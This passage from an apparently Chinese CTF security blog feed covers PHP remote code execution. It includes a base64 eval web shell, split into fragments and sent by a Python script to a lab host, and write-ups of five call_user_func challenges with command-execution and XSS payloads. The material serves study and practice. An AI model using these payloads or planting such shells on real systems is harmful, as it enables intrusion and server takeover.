直接写入 他转为base64编码</span><br><span class="line">&lt;?php eval($_POST[1]);   base64:PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br><span class="line">构造</span><br><span class="line">echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOw|base64 -d&gt;1.php</span><br><span class="line">sh f</span><br><span class="line">1.php 就是你的&lt;?php eval($_POST[1]);</span><br></pre></td></tr></table></figure><p>需要注意的是必须要将其中一个空格用<code>$&#123;IFS&#125;</code>代替，否则会被’吃’掉一个空格</p><p>这里有个小技巧，可以利用</p><p><code>echo &#39;PD9waHAgZXZhbCgkX1BPU1RbMV0pOw|base64 -d&gt;1.php&#39; | fold -w2 | sed &#39;s/$/\\\\/&#39;</code></p><p>直接拆分，只需要注意转义即可</p><p><img src="/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20250723204523305.png" alt="image-20250723204523305"></p><p>尝试写入</p><p>我写了一个脚本，来增加我们写入的效率</p><p>因为ls -t按时间先后顺序排序，所以需要倒置，同时加上<code>ls -ht &gt; a</code>的构造</p><p>这里要注意我们所传的值不能有重复的命名</p><p>运行脚本</p><p>完整的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"># 目标 URL</span><br><span class="line">url = &quot;http://192.168.197.134/rce/test.php?cmd=&quot;</span><br><span class="line">payload_lines = [</span><br><span class="line">    &quot;&gt;dir&quot;,</span><br><span class="line">    &quot;&gt;f\&gt;&quot;,</span><br><span class="line">    &quot;&gt;ht-&quot;,</span><br><span class="line">    &quot;&gt;sl&quot;,</span><br><span class="line">    &quot;*&gt;v&quot;,</span><br><span class="line">    &quot;&gt;rev &quot;,</span><br><span class="line">    &quot;*v&gt;a&quot;,</span><br><span class="line">    &quot;&gt;p &quot;,</span><br><span class="line">    &quot;&gt;ph\\&quot;,</span><br><span class="line">    &quot;&gt;1.\\&quot;,</span><br><span class="line">    &quot;&gt;\&gt;\\&quot;,</span><br><span class="line">    &quot;&gt;-d\\&quot;,</span><br><span class="line">    &quot;&gt;\ \\ &quot;,</span><br><span class="line">    &quot;&gt;64\\&quot;,</span><br><span class="line">    &quot;&gt;se\\&quot;,</span><br><span class="line">    &quot;&gt;ba\\&quot;,</span><br><span class="line">    &quot;&gt;\|\\ &quot;,</span><br><span class="line">    &quot;&gt;Ow\\&quot;,</span><br><span class="line">    &quot;&gt;0p\\&quot;,</span><br><span class="line">    &quot;&gt;MV\\&quot;,</span><br><span class="line">    &quot;&gt;Rb\\&quot;,</span><br><span class="line">    &quot;&gt;U1\\&quot;,</span><br><span class="line">    &quot;&gt;BP\\&quot;,</span><br><span class="line">    &quot;&gt;X1\\&quot;,</span><br><span class="line">    &quot;&gt;gk\\&quot;,</span><br><span class="line">    &quot;&gt;bC\\&quot;,</span><br><span class="line">    &quot;&gt;Zh\\&quot;,</span><br><span class="line">    &quot;&gt;ZX\\&quot;,</span><br><span class="line">    &quot;&gt;Ag\\&quot;,</span><br><span class="line">    &quot;&gt;aH\\&quot;,</span><br><span class="line">    &quot;&gt;9w\\&quot;,</span><br><span class="line">    &quot;&gt;PD\\&quot;,</span><br><span class="line">]</span><br><span class="line"># 逐个发送请求</span><br><span class="line">for line in payload_lines:</span><br><span class="line">    full_url = url + line</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(full_url, timeout=5)</span><br><span class="line">        print(f&quot;[+] Sent: &#123;line&#125; =&gt; Status: &#123;response.status_code&#125;&quot;)</span><br><span class="line">        # 可打印输出结果：print(response.text)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;[-] Failed to send &#123;line&#125;: &#123;e&#125;&quot;)</span><br><span class="line">    time.sleep(0.5)  # 建议加间隔，避免过快触发异常</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;EVAL长度限制突破技巧&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="RCE" scheme="https://heisha123.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>RCE 5道挑战题</title>
    <link href="https://heisha123.github.io/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/"/>
    <id>https://heisha123.github.io/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/</id>
    <published>2025-07-22T12:35:56.000Z</published>
    <updated>2025-08-25T06:56:05.849Z</updated>
    
    <content type="html"><![CDATA[<p>问题：</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$action = $_GET[&#x27;action&#x27;];</span><br><span class="line">$parameters = $_GET;</span><br><span class="line">if (isset($parameters[&#x27;action&#x27;])) &#123;</span><br><span class="line">    unset($parameters[&#x27;action&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">$a = call_user_func($action, $parameters);</span><br></pre></td></tr></table></figure><h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$action = $_GET[&#x27;action&#x27;];</span><br><span class="line">$parameters = $_GET;</span><br><span class="line">if (isset($parameters[&#x27;action&#x27;])) &#123;</span><br><span class="line">    unset($parameters[&#x27;action&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = call_user_func($action, ...$parameters);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们现在虚拟机下部署一下环境</p><p>分析</p><p>这里我们可以很容易的关注到</p><p><code>...$parameters</code> 这是一个可变参数</p><p><code>call_user_func</code> 这是一个回调函数</p><p><code>unset</code> 这个函数去官网查查</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722204842784.png" alt="image-20250722204842784"></p><p>发现他能够销毁<code>$parameters</code> 中的<code>action</code> </p><h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>我们试着传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=system&amp;0=id</span><br></pre></td></tr></table></figure><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722205051183.png" alt="image-20250722205051183"></p><p>成功执行了</p><p>我们下断看一下，是什么流程</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722205145800.png" alt="image-20250722205145800"></p><p>我们传入的 两个参数都会被 <code>...$parameters</code> 这个可变参数接收 形成了数组，</p><p>然后经过<code>unset($parameters[&#39;action&#39;]);</code> 会删除数组中的key是action的字段</p><p>最后只剩下了id</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722205339850.png" alt="image-20250722205339850"></p><p>最后执行了我们的回调函数</p><h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=usort&amp;0[0]=system&amp;0[1]=ls&amp;1=call_user_func</span><br></pre></td></tr></table></figure><p>这个解法的原理就是 因为<code>$parameters</code> 是可变参数，所以我们就可以利用他的特性</p><p><code>可变参数列表是指在函数的参数列表中使用省略号（…）来表示不定数量的参数。在函数中使用可变参数列表时，需要将该参数作为一个数组来处理</code></p><p>在看看官方文档<code>usort</code> 的定义</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722210024191.png" alt="image-20250722210024191"></p><p>我们可以看到他可以接收callback</p><p>那么这个payload的利用方式就是，给action传入usort，然后给parameters 传入system，ls，all_user_func</p><p>usort先给parameters数组排序，但是里面有callback，就会调用 all_user_func，然后all_user_func 又调用 system这个函数对ls做处理，最后达到了rce</p><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$action = $_GET[&#x27;action&#x27;];</span><br><span class="line">$parameters = $_GET;</span><br><span class="line">if (isset($parameters[&#x27;action&#x27;])) &#123;</span><br><span class="line">    unset($parameters[&#x27;action&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func($action, $parameters)($_POST[&#x27;a&#x27;])($_POST[&#x27;b&#x27;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个代码我在linux上复现发现，无论我将php版本调到5.6 还是7.3，都无法访问，爆500错误</p><p>然后我们尝试在代码前加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;display_errors&#x27;, 1);</span><br><span class="line">ini_set(&#x27;display_startup_errors&#x27;, 1);</span><br><span class="line">error_reporting(E_ALL);</span><br></pre></td></tr></table></figure><p>看看具体是什么原因的错误</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250723171004717.png" alt="image-20250723171004717"></p><p>他这里报错原因就是我们没post传值</p><p>我们在传值试试</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250723171056676.png" alt="image-20250723171056676"></p><h2 id="解法1-1"><a href="#解法1-1" class="headerlink" title="解法1"></a>解法1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=current&amp;a=current</span><br><span class="line">post:a[]=system&amp;b=whoami</span><br></pre></td></tr></table></figure><p>这道题的难点就在于</p><p><code>($_POST[&#39;a&#39;])($_POST[&#39;b&#39;]);</code> 如何利用，因为php中根本就没有这种写法，我们就很容易想到，会不会是先执行<code>call_user_func</code> 然后又出现一个函数执行第一个post，最后在执行 最后一个post，这里通过payload，</p><p>我们去官方文档查查 <code>current</code> 是个什么函数</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722214732234.png" alt="image-20250722214732234"></p><p>通过这个例子我们可以知道current就是 返回数组中的当前值</p><p>我们给action传入current，parameters数组中又是current，所以经过call_user_func把current取出来了，</p><p>就形成了current([system])(whoami)</p><p>current 又将system取出来</p><p>system(whoami)</p><p>然后执行了rce</p><h2 id="解法2-1"><a href="#解法2-1" class="headerlink" title="解法2"></a>解法2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=Closure::fromCallable&amp;0=Closure&amp;1=fromCallable</span><br><span class="line">post:a=system&amp;b=ls</span><br></pre></td></tr></table></figure><p>第二个的解法思路也感觉跟解法1差不多，就是函数用的不一样，我们去查一下</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722215610624.png" alt="image-20250722215610624"></p><p>我们可以看到它可以将callback 转换为闭包（closure）对象</p><p>也就是说，这里我们给cation传入的Closure::fromCallable，</p><p>数组传入的是<code>[&quot;Closure&quot;, &quot;fromCallable&quot;]</code></p><p>经过<code>call_user_func</code> 我们得到一个 <code>Closure</code> 对象，对应的是 <code>Closure::fromCallable</code> 这个函数本身的封装。</p><p>然后由这个函数来执行post[‘a’] 就变成了system(ls)</p><p>下面有一些实列能帮助我们理解</p><h3 id="将普通函数转换为闭包"><a href="#将普通函数转换为闭包" class="headerlink" title="将普通函数转换为闭包"></a>将普通函数转换为闭包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?Php</span><br><span class="line">function sayHello($name) &#123;</span><br><span class="line">  return &quot;Hello, $name!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">// 使用 Closure::fromCallable 将普通函数转换为闭包$closure = Closure::fromCallable(&#x27;sayHello&#x27;);</span><br><span class="line">// 调用闭包echo $closure(&#x27;World&#x27;); // 输出：Hello, World!?&gt;</span><br></pre></td></tr></table></figure><h3 id="将类方法转换为闭包"><a href="#将类方法转换为闭包" class="headerlink" title="将类方法转换为闭包"></a>将类方法转换为闭包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?Php</span><br><span class="line"></span><br><span class="line">class Greeter &#123;</span><br><span class="line">  public function greet($name) &#123;</span><br><span class="line">    return &quot;Greetings, $name!&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$greeter = new Greeter();</span><br><span class="line">// 将实例方法转换为闭包$closure = Closure::fromCallable([$greeter, &#x27;greet&#x27;]);</span><br><span class="line">// 调用闭包echo $closure(&#x27;Alice&#x27;); // 输出：Greetings, Alice!?&gt;</span><br></pre></td></tr></table></figure><h3 id="将静态方法转换为闭包"><a href="#将静态方法转换为闭包" class="headerlink" title="将静态方法转换为闭包"></a>将静态方法转换为闭包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?Php</span><br><span class="line">class StaticGreeter &#123;</span><br><span class="line">  public static function greet($name) &#123;</span><br><span class="line">    return &quot;Hello from static, $name!&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 将静态方法转换为闭包$closure = Closure::fromCallable([&#x27;StaticGreeter&#x27;, &#x27;greet&#x27;]);</span><br><span class="line">// 调用闭包echo $closure(&#x27;Bob&#x27;); // 输出：Hello from static, Bob!?&gt;</span><br></pre></td></tr></table></figure><h3 id="将匿名函数转换为闭包"><a href="#将匿名函数转换为闭包" class="headerlink" title="将匿名函数转换为闭包"></a>将匿名函数转换为闭包</h3><p>虽然匿名函数本身已经是闭包，但 <code>Closure::fromCallable</code> 可以用来创建一个新闭包对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$anonFunction` = `function($name) &#123;</span><br><span class="line">  return &quot;Hi, $name!&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">// 将匿名函数转换为闭包$closure = Closure::fromCallable($anonFunction);</span><br><span class="line">// 调用闭包echo $closure(&#x27;Charlie&#x27;); // 输出：Hi, Charlie!?&gt;</span><br></pre></td></tr></table></figure><h3 id="使用可调用对象"><a href="#使用可调用对象" class="headerlink" title="使用可调用对象"></a>使用可调用对象</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpclass CallableClass &#123;</span><br><span class="line">  public function __invoke($name) &#123;</span><br><span class="line">    return &quot;Invoked with $name!&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$callableObject = new CallableClass();</span><br><span class="line">// 将可调用对象转换为闭包$closure = Closure::fromCallable($callableObject);</span><br><span class="line">// 调用闭包echo $closure(&#x27;Dave&#x27;); // 输出：Invoked with Dave!?&gt;</span><br></pre></td></tr></table></figure><p><code>Closure::fromCallable</code> 方法提供了一种方便的方式将不同类型的可调用（函数、类方法、可调用对象）转换为闭包对象，从而可以用统一的方式来调用这些可调用。这个特性在编写更灵活的代码时非常有用，比如在函数式编程中或需要将不同的回调传递给函数时。</p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, <span class="variable">$parameters</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">glob</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/*&#x27;</span>))&gt;<span class="number">3</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;flag.txt&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析</p><p>这里利用的是readfile函数来读flag，但是这里判断了当前文件夹里是否有3个以上的文件，</p><p>这里我们知道，他原本的环境下应该只有两个文件，所以我们得想办法创建两个文件，</p><p>但是这里测试发现，常规的创建文件的方法都不适用，因为我们这里传入的第二个参数是一个数组</p><p>这里题目给的思路很独特，用用session，来创建文件</p><p>我们知道当用户与服务器开启对话的时候，客户端会生成ck，服务端会生成session文件，那么我们是不是可以尝试这个思路呢？</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722222738373.png" alt="image-20250722222738373"></p><p>查询官方文档发现<code>session_start</code>正好他可以通过<code>session.save_path</code> ；来指定路径，然后会创建session文件</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722223034185.png" alt="image-20250722223034185"></p><p>而且这个参数是用户可控的</p><p>在写入文件之前，首先通过报错来定位当前物理路径，报错的方法有很多，大体是通过引入一个函数并传递“不合法”的参数。</p><p>那么我们很容易想到payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=session_start&amp;save_path=/var/www</span><br></pre></td></tr></table></figure><p>测试发现无法写入&#x2F;var&#x2F;www&#x2F;html</p><p>但是将目录改为&#x2F;tmp,却成功写入了</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722223622812.png" alt="image-20250722223622812"></p><p>这里问大模型说</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722224048867.png" alt="image-20250722224048867"></p><p>当时的题目环境可能设置了这个吧</p><p>另外，其实也考虑过利用 upload_progress 来控制写入文件的内容，再配合其他include 来加载shell。这里有几点需要说明：</p><ol><li>需要开启 session.auto_start ，这个配置是无法动态开启的，需要环境默认开启。</li><li>写入文件以后，文件是以sess_ 开头并且文件名只能由这些字符构成：(0-9, a-z, A-Z, “-“, “,”) 。这也导致了不能直接写.php文件。</li></ol><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class A&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, <span class="variable">$parameters</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本题是为了演示加载静态方法（无参类型或参数均含有默认值）</p><p>这道题就很简单了</p><p>先调用A 这个class，然后在调用f这个函数，最后post[‘a’]传入执行的代码</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=call_user_func&amp;0=A&amp;1=f</span><br><span class="line">post: a=ls</span><br></pre></td></tr></table></figure><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722224632555.png" alt="image-20250722224632555"></p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Class A&#123;</span><br><span class="line">    static function f(string $a)&#123;</span><br><span class="line">        system($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$action = $_GET[&#x27;action&#x27;];</span><br><span class="line">$parameters = $_GET;</span><br><span class="line">if (isset($parameters[&#x27;action&#x27;])) &#123;</span><br><span class="line">unset($parameters[&#x27;action&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func($action, $parameters);</span><br><span class="line">echo $_POST[&#x27;a&#x27;];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题与上一道题的改变就是我们无法直接利用post[‘a’] 传入我们的执行代码了</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=ob_start&amp;0=A&amp;1=f</span><br><span class="line">post: a=touch /tmp/aaa</span><br></pre></td></tr></table></figure><p>这里他利用了<code>ob_start</code> 这个函数，我们去官方文档查查看</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722230857336.png" alt="image-20250722230857336"></p><p>他说他能够打开输出的缓冲区</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722231539904.png" alt="image-20250722231539904"></p><p>而且他说当冲刷（发送）、清理输出缓冲区或在脚本末尾冲刷输出缓冲区时，将调用 <code>callback</code>。</p><p>也就是说我们打开缓冲区后，$a 会自动的读取缓冲区的内容</p><p>所以我们可以在post[‘a’] ，实现任意的rce</p><p>比如</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722233100827.png" alt="image-20250722233100827"></p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722233104960.png" alt="image-20250722233104960"></p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722233111387.png" alt="image-20250722233111387"></p><p>这里的任意命令都可以执行，我们尝试执行一下 whoami</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722233144087.png" alt="image-20250722233144087"></p><p>但却发现没有回显，问问大模型</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722233211207.png" alt="image-20250722233211207"></p><p>我们修改一下源代码，加入return</p><p>再次测试</p><p><img src="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/image-20250722233250238.png" alt="image-20250722233250238"></p><p>成功回显，可能问题就是这里，这里我们可以发现，当我们打开缓冲区后，$a 会从缓冲区来取值，</p><p>从而实现rce</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在这样的代码环境下，我们能做的有这样几点：</p><ol><li><p>可通过var_dump引入反射型xss(<code>?action=var_dump&amp;1=&lt;script&gt;alert(1)&lt;/script&gt;</code>)；</p></li><li><p>可通过引入报错来获取物理路径；</p></li><li><p>可通过session_start 写入文件，写入文件路径可自定义，文件内容是否可控要看服务器配置；</p></li><li><p>加载php内置函数或原生类&#x2F;已有类的静态方法，函数参数类型需为：Array、Mixed、callable。 其中callable类型可再次加载 ，并以数组形式传入类名和静态方法名称。 如果函数有多个参数，其他参数需要有默认参数，无默认参数的那个参数需满足以上参数类型条件。若函数参数均有默认参数,首个参数类型需满足以上参数类型条件。</p></li><li><p>当有echo 配合时，可通过ob_start 加载原生类&#x2F;已有类的静态函数，函数参数支持string类型。</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;问题：&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="RCE" scheme="https://heisha123.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>[GYCTF2020]Ez_Express</title>
    <link href="https://heisha123.github.io/2025/07/19/GYCTF2020-Ez-Express/"/>
    <id>https://heisha123.github.io/2025/07/19/GYCTF2020-Ez-Express/</id>
    <published>2025-07-18T16:27:13.000Z</published>
    <updated>2025-07-18T17:07:01.206Z</updated>
    
